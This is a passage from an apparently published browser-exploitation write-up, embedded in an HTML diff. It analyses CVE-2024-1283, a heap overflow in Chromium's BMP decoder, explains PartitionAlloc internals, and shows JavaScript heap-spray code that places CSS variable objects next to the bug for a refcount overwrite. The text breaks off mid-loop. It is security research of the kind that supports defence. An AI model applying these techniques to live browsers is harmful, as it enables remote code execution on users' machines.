@@ -1,0 +1,1093 @@
+<html>
+	<head>
+		<title>OpenCompiled.oeg</title>
+		<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Page Title</title>
+    <link rel="stylesheet" href="../index.css">
+	</head>
+
+<body>
+
+	<h1><a href="../index.html" class="header">Open Compiled</a></h1>
+	<a href="../index.html"><img alt="tux" src="../images/tux.webp" width="50px" style="float:right"/></a>
+	<h4>Advancing the Linux Kernel: Performance, Scalability, and Security for the Future of High-Performance Computing</h4>
+	
+	<hr/>
+
+
+<h2 id="toc">TOC</h2>
+<p>0 - Introduction<br>
+1 - Chromium rendering engine overview<br>
+2 - Case study: BMP 0day<br>
+  2.1 - Bug power, the primitives<br>
+3 - PartitionAlloc, the memory allocator<br>
+  3.1 - PartitionAlloc security guarantees<br>
+4 - Exploitation<br>
+5 - Takeaways, advances, etc etc etc<br>
+6 - References<br>
+5 - Exploit code</p>
+<h2 id="0-introduction">0 - Introduction</h2>
+<p>This article will try to explain a lot about chrome, blink and
+PartitionAlloc internals and apply all this knowledge to transform an
+extremely restricted bug into arbitrary code execution.</p>
+<p>The vulnerability in question is CVE-2024-1283, a heap overflow in the
+Blink engine that occurs when decoding BMP images. Using a couple of new
+techniques very similar to recent Linux kernel tricks like elastic heap
+objects and cross-cache overflow, we can abuse PartitionAlloc and exploit,
+in theory, any memory write bug, resulting in full shellcode execution.</p>
+<h2 id="1-chromium-rendering-engine-overview">1 - Chromium rendering engine overview</h2>
+<p>Chromium, and all Chromium-based browsers, use the &quot;Blink rendering 
+engine&quot; [1]. This component is responsible for much of what happens 
+within the renderer process, such as parsing HTML, CSS, decoding 
+images, and more. </p>
+<blockquote>
+<p> &quot;A browser engine (also known as a layout engine or rendering engine) 
+ is a core software component of every major web browser. The primary 
+ job of a browser engine is to transform HTML documents and other 
+ resources of a web page into an interactive visual representation 
+ on a user&#39;s device.&quot; [2]</p>
+</blockquote>
+<p>Blink is used by Chromium, but is considered a separate library. Its code
+can be found within the Chromium source at <code>src/third_party/blink</code>, and
+its own repository can be found here [3].</p>
+<p>While it is the responsibility of Blink, not all major functions are
+necessarily written in its code. For example, executing JavaScript is
+necessary for a rendering engine, but not all of the JS engine is part
+of the main code. </p>
+<p>This is the case with V8, the JavaScript engine used, which is separate 
+in the code at <code>v8/</code>. It also has its own repository [4]. The same applies
+to some image formats [5] and video formats [6]. However, other image 
+formats are entirely processed by Blink, such as &quot;BMP&quot;, &quot;AVIF&quot;, and some 
+others. </p>
+<p>We can see them in <code>src/third_party/blink/renderer/platform/image-decoders</code></p>
+<h2 id="2-case-study-bmp-0day">2 - Case study: BMP 0day</h2>
+<p>After spending some time fuzzing these isolated image formats, I was able
+to find a very interesting bug, a &quot;heap-overflow&quot; within BMPImageDecoder
+(ASAN shows it as if the overflow happened within Skia, resulting in an
+incorrect title for the CVE [7]). Let&#39;s understand how this bug occurs,
+and what its primitives are! We can start by analyzing the 
+ASAN stack trace:</p>
+<pre><code class="lang-bash">  r3tr0@chrome:~/fuzz/bmp$ cat /tmp/bad.bmp | ./test-crash
+  =<span class="hljs-number">875756</span> ERROR: AddressSanitizer: heap-buffer-overflow on address[redacted]
+  READ <span class="hljs-keyword">of</span> size <span class="hljs-number">32</span> at <span class="hljs-number">0x521000001100</span> thread TO
+  #<span class="hljs-number">0</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> unsigned int vector [<span class="hljs-number">8</span>] skcms_private::hsw::load()
+  #<span class="hljs-number">1</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> skcms_private::hsw::Exec_load_8888_k() 
+  #<span class="hljs-number">2</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> skcms_private::hsw::Exec_load_8888()
+  #<span class="hljs-number">3</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> skcms_private:: hsw::exec_stages ()
+  #<span class="hljs-number">4</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> skcms_private::hsu::run_program()
+  #<span class="hljs-number">5</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> skcms_Transform
+  #<span class="hljs-number">6</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> blink::BMPImageReader::ColorCorrectCurrentRow()
+  #<span class="hljs-number">7</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> blink::BMPImageReader::ProcessRLEData()
+  #<span class="hljs-number">8</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> blink::BMPImageReader::DecodePixelData(bool)
+  #<span class="hljs-number">9</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> blink::BMPImageReader::DecodeBMP(bool)
+  #<span class="hljs-number">10</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> blink::BMPImageDecoder::DecodeHelper(bool)
+  #<span class="hljs-number">11</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> blink::BMPImageDecoder::Decode(bool)
+  #<span class="hljs-number">12</span> <span class="hljs-number">0xdead</span> <span class="hljs-keyword">in</span> blink::ImageDecoder::DecodeFrameBufferAtIndex()
+  [redacted]
+</code></pre>
+<p>The last function within blink is BMPImageReader::ColorCorrectCurrentRow().
+We can see a snippet of this function below:</p>
+<pre><code class="lang-c++">  void BMPImageReader::ColorCorrectCurrentRow() {
+    ...
+    <span class="hljs-comment">// address calc here</span>
+    ImageFrame::PixelData* <span class="hljs-keyword">const</span> row = buffer_-&gt;GetAddr(<span class="hljs-number">0</span>, coord_.y());
+    ...
+    <span class="hljs-keyword">const</span> <span class="hljs-keyword">bool</span> success =
+        skcms_Transform(row, fmt, alpha, transform-&gt;SrcProfile(), row, fmt, alpha,
+                        transform-&gt;DstProfile(), parent_-&gt;Size().width());
+    DCHECK(success);
+    buffer_-&gt;SetPixelsChanged(<span class="hljs-literal">true</span>);
+  }
+</code></pre>
+<p>With a little debugging help, we can conclude that there is an address
+calculation error in <code>buffer_-&gt;GetAddr(0, coord_.y());</code>, where this
+function ends up being resolved to this other inline function:</p>
+<pre><code class="lang-c++">  <span class="hljs-function"><span class="hljs-keyword">const</span> uint32_t* <span class="hljs-title">addr32</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> <span class="hljs-keyword">const</span> </span>{
+    SkASSERT((<span class="hljs-keyword">unsigned</span>)x &lt; (<span class="hljs-keyword">unsigned</span>)fInfo.width());
+    SkASSERT((<span class="hljs-keyword">unsigned</span>)y &lt; (<span class="hljs-keyword">unsigned</span>)fInfo.height());
+    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">uint32_t</span>*)((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)<span class="hljs-keyword">this</span>-&gt;addr32() + (<span class="hljs-keyword">size_t</span>)y * fRowBytes + (x &lt;&lt; <span class="hljs-number">2</span>));
+  }
+</code></pre>
+<p>This function can also be summarized in a single line
+<code>this-&gt;addr32() + y * fRowBytes + (x &lt;&lt; 2)</code>. </p>
+<p>Somehow <code>coord_.y()</code> is equal to -1 in the iteration that causes a crash,
+and if we resolve this calculation with this value we can understand why:</p>
+<pre><code class="lang-cpp">  this-&gt;<span class="hljs-keyword">addr32() </span>+ y * fRowBytes + (x &lt;&lt; <span class="hljs-number">2</span>)<span class="hljs-comment">;</span>
+  <span class="hljs-keyword">base_addr </span>+ -<span class="hljs-number">1</span> * fRowBytes + (<span class="hljs-number">0</span> &lt;&lt; <span class="hljs-number">2</span>)<span class="hljs-comment">;</span>
+  <span class="hljs-keyword">base_addr </span>- fRowBytes<span class="hljs-comment">;</span>
+</code></pre>
+<p>Assuming the variables we know, <code>this-&gt;addr32()</code> is the base address of
+the image decoding chunk, y is -1, and x is equal to 0. </p>
+<p>Thus, the result will be the base address minus fRowBytes, resulting in 
+an address pointing behind the start of the chunk, and the function 
+subsequently called within Skia that effectively writes into this input 
+buffer. We can treat this like a <code>memcpy</code>. The flaw is not in the 
+function but in what is passed to it.</p>
+<p>Looking at the patch [8] makes it clearer why this happens. It&#39;s a simple
+off-by-one bug, where the <code>ColorCorrectCurrentRow()</code> function is called
+one more time than expected. Since decoding occurs <code>top_down</code>, with
+each iteration 1 is subtracted from y, instead of ending at 0, the next
+iteration happens and subtracting y once again turns it into -1.</p>
+<h3 id="2-1-bug-power-the-primitives">2.1 - Bug power, the primitives</h3>
+<p>Very good, but what kind of primitives does this bug give us? Where and
+what can we write? Analyzing the <code>skcms_Transform</code> function, it receives
+a kind of &quot;bytecodes&quot; for an image transformation VM. The important part
+is that we don&#39;t control the bytecode sent, only the input buffer, so we
+can&#39;t control what is written. Let&#39;s analyze an example at runtime and 
+see what happens:</p>
+<pre><code>  pwndbg&gt; x/<span class="hljs-number">6</span>gx $rdi
+  <span class="hljs-number">0</span>x<span class="hljs-number">1180136a000</span>: <span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span>    <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>
+  <span class="hljs-number">0</span>x<span class="hljs-number">1180136a010</span>: <span class="hljs-number">0</span>x43434<span class="hljs-number">34343434343</span>    <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span>
+  <span class="hljs-number">0</span>x<span class="hljs-number">1180136a020</span>: <span class="hljs-number">0</span>x45454<span class="hljs-number">54545454545</span>    <span class="hljs-number">0</span>xff00ff00ff00ff00
+  pwndbg&gt; continue
+  [redacted]
+  pwndbg&gt; x/<span class="hljs-number">6</span>gx <span class="hljs-number">0</span>x<span class="hljs-number">1180136a000</span>
+  <span class="hljs-number">0</span>x<span class="hljs-number">1180136a000</span>: <span class="hljs-number">0</span>x41000<span class="hljs-number">00041000000</span>    <span class="hljs-number">0</span>x42000<span class="hljs-number">00042000000</span>
+  <span class="hljs-number">0</span>x<span class="hljs-number">1180136a010</span>: <span class="hljs-number">0</span>x43000<span class="hljs-number">00043000000</span>    <span class="hljs-number">0</span>x44000<span class="hljs-number">00044000000</span>
+  <span class="hljs-number">0</span>x<span class="hljs-number">1180136a020</span>: <span class="hljs-number">0</span>x45000<span class="hljs-number">00045000000</span>    <span class="hljs-number">0</span>xff00ff00ff00ff00
+</code></pre><p>Basically, we can only write null bytes with the exception of bytes 0xff
+which are ignored. The most-significant-byte of every 4 bytes is also
+ignored. These are quite limited writing primitives, but still powerful.</p>
+<p>Now that we know what we can write, let&#39;s see where we can write. Going
+back to the address calculation, the only variable we haven&#39;t talked about
+is fRowBytes. </p>
+<p>In our case this variable is always 1/4 of the chunk size, which we can 
+partially control using the height and width of the image. This results 
+in a partial overflow of the end of the last chunk, assuming the BMP image
+chunk has 0x1000 bytes, the last 0x400 bytes will be corrupted:</p>
+<pre><code>
+            0x400 bytes corrupted
+                  \     /  
+  +---------------------+--------------------+
+  |<span class="hljs-string">               </span>|<span class="hljs-string">XXXXX</span>|<span class="hljs-string">                    </span>|
+  |<span class="hljs-string"> Another chunk </span>|<span class="hljs-string">XXXXX</span>|<span class="hljs-string"> BMP chunk(0x1000)  </span>|
+  |<span class="hljs-string">               </span>|<span class="hljs-string">XXXXX</span>|<span class="hljs-string">                    </span>|
+  +---------------------+--------------------+
+</code></pre><p>Now everything seems like a lost cause, since we can only write null bytes.
+The best idea is to overwrite a <code>ref_count_</code> property, but all of them are 
+located at the beginning of the chunk. To move forward, we need to better 
+understand how Chromium&#39;s custom memory allocator works.</p>
+<h2 id="3-partitionalloc-the-memory-allocator">3 - PartitionAlloc, the memory allocator</h2>
+<blockquote>
+<p>&quot;PartitionAlloc is a memory allocator optimized for space efficiency,
+allocation latency, and security.&quot; [9] (and developed by Google and used
+in Chromium by default)</p>
+</blockquote>
+<p>Quickly, we can highlight the most important things about PartitionAlloc:</p>
+<ul>
+<li>It&#39;s a SLAB allocator, which means it pre-allocates memory and
+organizes it into fixed-size chunks, which is very important from
+a security perspective.</li>
+<li>There&#39;s a thread cache, like tcache in glibc heap.</li>
+<li>There are some &quot;soft-protections&quot; against certain types of memory
+management bugs, like double-free.</li>
+<li>After freeing a slot, the freelist pointer is written in
+big-endian at the beginning of this slot.</li>
+</ul>
+<p>When exploring a SLAB allocator, similar to the kernel, we expect a
+   very direct exploitation path. Only objects of the same size are 
+   allocated adjacent to each other. Therefore, the vulnerable object 
+   and the victim must share the same size or similar.</p>
+<p>Everything in PartitionAlloc is allocated within &quot;pages&quot;, which can be:</p>
+<ul>
+<li><p>System Page
+A page defined by the OS, typically 4KiB, but supports up to 64KiB.</p>
+</li>
+<li><p>Partition Page
+Consists of exactly 4 system pages.</p>
+</li>
+<li><p>Super Page
+A 2MiB region, aligned on a 2MiB boundary.</p>
+</li>
+<li><p>Extent
+An extent is a run of consecutive super pages.</p>
+</li>
+</ul>
+<pre><code> System Page
+     ^
+  +------+
+  |<span class="hljs-string">      </span>|
+  +------+
+
+         Partition Page
+                ^
+  +------+------+------+------+
+  |<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|<span class="hljs-string">      </span>|
+  +------+------+------+------+
+
+                  Super page (2MiB)
+                          ^
+  +-----------------------------------------------------+
+  |<span class="hljs-string">                                                     </span>|
+  +-----------------------------------------------------+
+</code></pre><p>Within each Super Page, several Partition Pages are allocated, where the
+smallest memory units can be divided into:</p>
+<ul>
+<li>Slot: is a single unit chunk</li>
+<li>Slot span: is a run of same-sized chunks</li>
+<li>Bucket: Chains slot spans containing slots of similar size</li>
+</ul>
+<pre><code>    +-------------------+     +------------------+    +-------------+
+    |<span class="hljs-string">...</span>|<span class="hljs-string"> PartitionPage </span>|<span class="hljs-string"> -&gt;  </span>|<span class="hljs-string"> SlotSpanMetadata </span>|<span class="hljs-string"> -&gt; </span>|<span class="hljs-string">freelist_head</span>|
+    +-------------------+     +------------------+    |<span class="hljs-string">-------------</span>|
+     \                /                               |<span class="hljs-string">   bucket    </span>|
+      \              /                                +-------------+
+       \            /                                         |<span class="hljs-string">
+        \          /                                          V
++--------------------------------------------------+  +------------------+
+</span>|<span class="hljs-string">       </span>|<span class="hljs-string">          </span>|<span class="hljs-string">       </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     </span>|<span class="hljs-string">       </span>|<span class="hljs-string">  </span>|<span class="hljs-string"> Partition Bucket </span>|
+|<span class="hljs-string"> Guard </span>|<span class="hljs-string"> Metadata </span>|<span class="hljs-string"> Guard </span>|<span class="hljs-string"> N pages </span>|<span class="hljs-string"> ... </span>|<span class="hljs-string"> Guard </span>|<span class="hljs-string">  +------------------+
+</span>|<span class="hljs-string">       </span>|<span class="hljs-string">          </span>|<span class="hljs-string">       </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     </span>|<span class="hljs-string">       </span>|
++--------------------------------------------------+
+                  Super Page
+</code></pre><p>An entire Super Page is allocated as follows: Right at the beginning there
+are 3 pages (2 &quot;Guard Pages&quot; which are pages with PROT_NONE to prevent any
+kind of linear corruption, and a Metadata page between the other two). This
+page has a list of &quot;Partition Pages&quot;, which is a struct that controls some
+information about the Partition Pages. It also has the SlotSpanMetadata
+property, which, besides the freelist_head of that span, has the pointer
+to that Bucket.</p>
+<pre><code>  +------------------+
+  |<span class="hljs-string"> Partition Bucket </span>|<span class="hljs-string">-------+     +----+
+  +------------------+       </span>|<span class="hljs-string">     </span>|<span class="hljs-string">    </span>|
+                             v     |<span class="hljs-string">    v
++--------------------------------------------------+
+</span>|<span class="hljs-string">       </span>|<span class="hljs-string">          </span>|<span class="hljs-string">       </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     </span>|<span class="hljs-string">       </span>|
+|<span class="hljs-string"> Guard </span>|<span class="hljs-string"> Metadata </span>|<span class="hljs-string"> Guard </span>|<span class="hljs-string"> N pages </span>|<span class="hljs-string"> ... </span>|<span class="hljs-string"> Guard </span>|
+|<span class="hljs-string">       </span>|<span class="hljs-string">          </span>|<span class="hljs-string">       </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     </span>|<span class="hljs-string">       </span>|
++--------------------------------------------------+
+</code></pre><p>Each Partition Bucket is a linked list to other buckets of similar sizes.</p>
+<pre><code>   This is a single slot
+              |<span class="hljs-string">        +-----------------+ 
+              +-------&gt;</span>|<span class="hljs-string">0x1000</span>|<span class="hljs-string">0x1000</span>|<span class="hljs-string">...</span>|
+                       |<span class="hljs-string">-----------------</span>|<span class="hljs-string"> -&gt; this is a slot span
+                       </span>|<span class="hljs-string">0x1000</span>|<span class="hljs-string">0x1000</span>|<span class="hljs-string">...</span>|
+                       +-----------------+
+                        \               /
+                         \             /
+                          \           /
+                           \         /
++--------------------------------------------------+
+|<span class="hljs-string">       </span>|<span class="hljs-string">          </span>|<span class="hljs-string">       </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     </span>|<span class="hljs-string">       </span>|
+|<span class="hljs-string"> Guard </span>|<span class="hljs-string"> Metadata </span>|<span class="hljs-string"> Guard </span>|<span class="hljs-string"> N pages </span>|<span class="hljs-string"> ... </span>|<span class="hljs-string"> Guard </span>|
+|<span class="hljs-string">       </span>|<span class="hljs-string">          </span>|<span class="hljs-string">       </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     </span>|<span class="hljs-string">       </span>|
++--------------------------------------------------+
+</code></pre><p>Each Slot Span can be composed of N Partition Pages and has several slots
+of exactly the same size adjacent.</p>
+<p>PartitionAlloc also has a per-thread cache. It is built to meet the needs
+of most common allocations and avoid performance loss in the central
+allocator that requires a context lock to prevent two allocations from
+returning the same slot. </p>
+<blockquote>
+<p>The thread cache has been tailored to satisfy a vast majority of 
+requests by allocating from and releasing memory to the main allocator 
+ in batches, amortizing lock acquisition and further improving locality 
+ while not trapping excess memory.&quot; [10]</p>
+</blockquote>
+<h3 id="3-1-partitionalloc-security-guarantees">3.1 - PartitionAlloc security guarantees</h3>
+<p>When looking from a security perspective, PartitionAlloc delivers some
+guarantees:</p>
+<pre><code>  <span class="hljs-number">1.</span> Linear overflows/underflows cannot corrupt <span class="hljs-keyword">into</span>, out <span class="hljs-keyword">of</span>, <span class="hljs-keyword">or</span> between
+     partitions. There are guard pages <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> beginning <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> <span class="hljs-function"><span class="hljs-keyword">end</span> <span class="hljs-title">of</span></span>
+     <span class="hljs-keyword">each</span> memory region owned <span class="hljs-keyword">by</span> <span class="hljs-keyword">a</span> partition.
+
+  <span class="hljs-number">2.</span> Linear overflows/underflows cannot corrupt <span class="hljs-keyword">the</span> allocation metadata.
+     PartitionAlloc records metadata <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> dedicated, out-<span class="hljs-keyword">of</span>-<span class="hljs-built_in">line</span> region
+     (<span class="hljs-keyword">not</span> adjacent <span class="hljs-built_in">to</span> objects), surrounded <span class="hljs-keyword">by</span> guard pages. (Freelist
+     pointers are <span class="hljs-keyword">an</span> exception.)
+
+  <span class="hljs-number">3.</span> Partial pointer overwrite <span class="hljs-keyword">of</span> freelist pointer should fault.
+
+  <span class="hljs-number">4.</span> Direct map allocations have guard pages <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> beginning <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">end</span>.
+
+  <span class="hljs-number">5.</span> One page can contain only objects <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> same bucket. Even <span class="hljs-keyword">after</span>
+     this page is completely freed
+</code></pre><p>If we look closely, guarantees 1 and 2 basically prevent corruptions
+against the Metadata Page and overflow between Super Pages. This is the
+job of the &quot;Guard Page&quot; mentioned above, a memory page with the PROT_NONE
+protection, which will cause a crash when trying to read, write, or
+execute anything within that page. </p>
+<p>Guarantee 3 simply involves storing the freelist pointer in big-endian 
+format. So by partially corrupting this pointer, converting it to little 
+endian would completely change the pointer. </p>
+<p>Guarantee 4 is just a variation of guarantees 1 and 2, where, if it is 
+necessary to allocate a very large chunk that does not fit into a common 
+Super Page, this memory is allocated directly by mapping memory. This 
+mapped memory is again placed between two &quot;Guard Pages&quot;, one at
+the beginning and one at the end. </p>
+<p>Finally, guarantee 5 is useful against type confusion attacks and attempts 
+to abuse a UAF between pages.</p>
+<p>So, if you paid attention, there are no guarantees or protections that
+prevent two buckets of completely different sizes from being allocated
+adjacent to each other without any kind of red zone between them (as is
+the case of Guard Pages between Super Pages). Therefore, it is entirely
+possible and stable to create this layout:</p>
+<pre><code>  vuln obj size=0x1000   victim obj size=0x4000
+       +----------+        +----------+
+       |<span class="hljs-string">    ...   </span>|<span class="hljs-string">        </span>|<span class="hljs-string">  victim  </span>|
+       |<span class="hljs-string">----------</span>|<span class="hljs-string">        </span>|<span class="hljs-string">----------</span>|
+       |<span class="hljs-string">   vuln   </span>|<span class="hljs-string">        </span>|<span class="hljs-string">    ...   </span>|
+       +----------+        +----------+
+        \          \      /           /
+         \          \    /           /
+          \          \  /           /
+           \          \/           /
++---------------------------------------------------+
+|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">         </span>|<span class="hljs-string">            </span>|<span class="hljs-string">            </span>|<span class="hljs-string">   </span>|
+|<span class="hljs-string"> G </span>|<span class="hljs-string"> M </span>|<span class="hljs-string"> G </span>|<span class="hljs-string"> 2 pages </span>|<span class="hljs-string">  3 pages   </span>|<span class="hljs-string"> ...N pages </span>|<span class="hljs-string"> G </span>|
+|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">         </span>|<span class="hljs-string">            </span>|<span class="hljs-string">            </span>|<span class="hljs-string">   </span>|
++---------------------------------------------------+
+</code></pre><p>Testing the hypothesis, I could verify that we can create extremely stable
+memory layouts with the same objects of different sizes adjacent to each
+other.</p>
+<h2 id="4-exploitation">4 - Exploitation</h2>
+<p>With the possibility of overflowing into any other slot of a different
+size, we just need to find an interesting target. We could search for an
+object with a |length_| property, but since we can only write null bytes,
+I believe we can take more advantage of the bug by attacking a
+|ref<em>count</em>| property. Looking for references of good targets, we can
+follow existing work used to exploit the well-known &quot;The WebP 0day&quot; [11].</p>
+<p>Objects and structures in CSS are allocated by Blink itself. Among these
+objects is CSSVariableData, which represents the value of variables within
+CSS [12]. It seems to be a great target for several reasons:</p>
+<ul>
+<li><p>It&#39;s an elastic object, so we can force it to fit in our case or any
+other; this object can vary in size between 16 bytes and
+2097152 bytes (<code>kMaxVariableBytes</code>).</p>
+</li>
+<li><p>It&#39;s a &quot;ref counted&quot; object.</p>
+</li>
+<li><p>It doesn&#39;t have any pointers that could cause a crash when
+dereferenced.</p>
+</li>
+</ul>
+<p>In <code>css_variable_data.h</code>, we can see the description of the object:</p>
+<pre><code class="lang-cpp"><span class="hljs-keyword">class</span> CORE_EXPORT CSSVariableData : <span class="hljs-keyword">public</span> RefCounted&lt;CSSVariableData&gt; {
+  ...
+ <span class="hljs-keyword">private</span>:
+ ...
+  <span class="hljs-comment">// 32 bits refcount before this.</span>
+
+  <span class="hljs-comment">// We'd like to use bool for the booleans, but this causes the struct to</span>
+  <span class="hljs-comment">// balloon in size on Windows:</span>
+  <span class="hljs-comment">// https://randomascii.wordpress.com/2010/06/06/bit-field-packing-with-visual-c/</span>
+
+  <span class="hljs-comment">// Enough for storing up to 2MB (and then some), cf. kMaxSubstitutionBytes.</span>
+  <span class="hljs-comment">// The remaining 4 bits are kept in reserve for future use.</span>
+  <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> length_ : <span class="hljs-number">22</span>;
+  <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> is_animation_tainted_ : <span class="hljs-number">1</span>;       <span class="hljs-comment">// bool.</span>
+  <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> needs_variable_resolution_ : <span class="hljs-number">1</span>;  <span class="hljs-comment">// bool.</span>
+  <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> is_8bit_ : <span class="hljs-number">1</span>;                    <span class="hljs-comment">// bool.</span>
+  <span class="hljs-keyword">unsigned</span> has_font_units_ : <span class="hljs-number">1</span>;                   <span class="hljs-comment">// bool.</span>
+  <span class="hljs-keyword">unsigned</span> has_root_font_units_ : <span class="hljs-number">1</span>;              <span class="hljs-comment">// bool.</span>
+  <span class="hljs-keyword">unsigned</span> has_line_height_units_ : <span class="hljs-number">1</span>;            <span class="hljs-comment">// bool.</span>
+  <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> unused_ : <span class="hljs-number">4</span>;
+</code></pre>
+<p>In memory, this object reflects this layout:</p>
+<pre><code><span class="hljs-section">0            4            8                         16
++------------+----------+-+-------------------------+</span>
+<span class="hljs-section">| ref_count_ | length_  |F|     String content      |
++------------+----------+-+-------------------------+</span>
+<span class="hljs-section">|                String content...                  |
++---------------------------------------------------+</span>
+&gt; F = flags
+</code></pre><p>And the code that allocates this object can be found in the same file:</p>
+<pre><code class="lang-cpp"><span class="hljs-comment">// third_party/blink/renderer/core/css/css_variable_data.h:34</span>
+<span class="hljs-keyword">static</span> scoped_refptr&lt;CSSVariableData&gt; Create(StringView original_text,
+                                             <span class="hljs-keyword">bool</span> is_animation_tainted,
+                                             <span class="hljs-keyword">bool</span> needs_variable_resolution,
+                                             <span class="hljs-keyword">bool</span> has_font_units,
+                                             <span class="hljs-keyword">bool</span> has_root_font_units,
+                                             <span class="hljs-keyword">bool</span> has_line_height_units) {
+  <span class="hljs-keyword">if</span> (original_text.length() &gt; kMaxVariableBytes) {
+    <span class="hljs-comment">// This should have been blocked off during variable substitution.</span>
+    NOTREACHED();
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
+  }
+
+  <span class="hljs-keyword">wtf_size_t</span> bytes_needed =
+      <span class="hljs-keyword">sizeof</span>(CSSVariableData) + (original_text.Is8Bit()
+                                     ? original_text.length()
+                                     : <span class="hljs-number">2</span> * original_text.length());
+  <span class="hljs-keyword">void</span>* buf = WTF::Partitions::FastMalloc(
+      bytes_needed, WTF::GetStringWithTypeName&lt;CSSVariableData&gt;());
+  <span class="hljs-keyword">return</span> base::AdoptRef(<span class="hljs-keyword">new</span> (buf) CSSVariableData(
+      original_text, is_animation_tainted, needs_variable_resolution,
+      has_font_units, has_root_font_units, has_line_height_units));
+}
+</code></pre>
+<p>Well, it seems like a great target, but now we need to discuss which
+bucket this object will be allocated in. Due to the thread cache, the
+objects won&#39;t be placed together. We need to force the thread cache to 
+clear the bucket so that our vulnerable object and victim share the same
+Super Page. Luckily, this is quite simple to do. We just need to fill the
+cache up to the &quot;limit&quot;, as can be seen in this comment:</p>
+<pre><code class="lang-cpp"><span class="hljs-comment">// base/allocator/partition_allocator/src/partition_alloc/thread_cache.cc:586</span>
+
+<span class="hljs-comment">// For each bucket, there is a |limit| of how many cached objects there are in</span>
+<span class="hljs-comment">// the bucket, so |count| &lt; |limit| at all times.</span>
+<span class="hljs-comment">// - Clearing: limit -&gt; limit / 2</span>
+<span class="hljs-comment">// - Filling: 0 -&gt; limit / kBatchFillRatio</span>
+</code></pre>
+<p>The code that executes this subroutine can be seen below:</p>
+<pre><code class="lang-cpp"><span class="hljs-comment">// base/allocator/partition_allocator/src/partition_alloc/thread_cache.h:511</span>
+
+PA_ALWAYS_INLINE <span class="hljs-keyword">bool</span> ThreadCache::MaybePutInCache(<span class="hljs-keyword">uintptr_t</span> slot_start,
+                                                   <span class="hljs-keyword">size_t</span> bucket_index,
+                                                   <span class="hljs-keyword">size_t</span>* slot_size) {
+  PA_REENTRANCY_GUARD(is_in_thread_cache_);
+  ...
+  <span class="hljs-keyword">auto</span>&amp; bucket = buckets_[bucket_index];
+  ...
+  <span class="hljs-keyword">uint8_t</span> limit = bucket.limit.load(<span class="hljs-built_in">std</span>::memory_order_relaxed);
+  <span class="hljs-comment">// Batched deallocation, amortizing lock acquisitions.</span>
+  <span class="hljs-keyword">if</span> (PA_UNLIKELY(bucket.count &gt; limit)) {
+    ClearBucket(bucket, limit / <span class="hljs-number">2</span>);
+  }
+  ...
+</code></pre>
+<p>Now let&#39;s create this layout with JS. How can we manipulate these objects
+to create a perfect layout?</p>
+<p>First, let&#39;s force the allocation of a new Super Page to have more
+control, for this, we can simply do several sprays</p>
+<pre><code class="lang-cpp"><span class="hljs-keyword">let</span> div0 = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'div0'</span>);
+<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++) {
+  div0.style.setProperty(<span class="hljs-string">`--sprayA<span class="hljs-subst">${i}</span>`</span>, kCSSString);
+  div0.style.setProperty(<span class="hljs-string">`--sprayC<span class="hljs-subst">${i}</span>`</span>, kCSSStringCross0x2000);
+  div0.style.setProperty(<span class="hljs-string">`--sprayB<span class="hljs-subst">${i}</span>`</span>, kCSSStringHRTF);
+}
+</code></pre>
+<p>After that, let&#39;s force object A to be adjacent to C. Object B should be
+allocated close, but not adjacent to, the others as it will be useful for
+acquiring memory leaks.</p>
+<pre><code class="lang-cpp"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++) {
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) {
+    <span class="hljs-comment">// spraying allocation of 2 different size spans</span>
+    <span class="hljs-comment">// very close to 100% of attempts, the same object is allocated</span>
+    <span class="hljs-comment">// after a different sized slot</span>
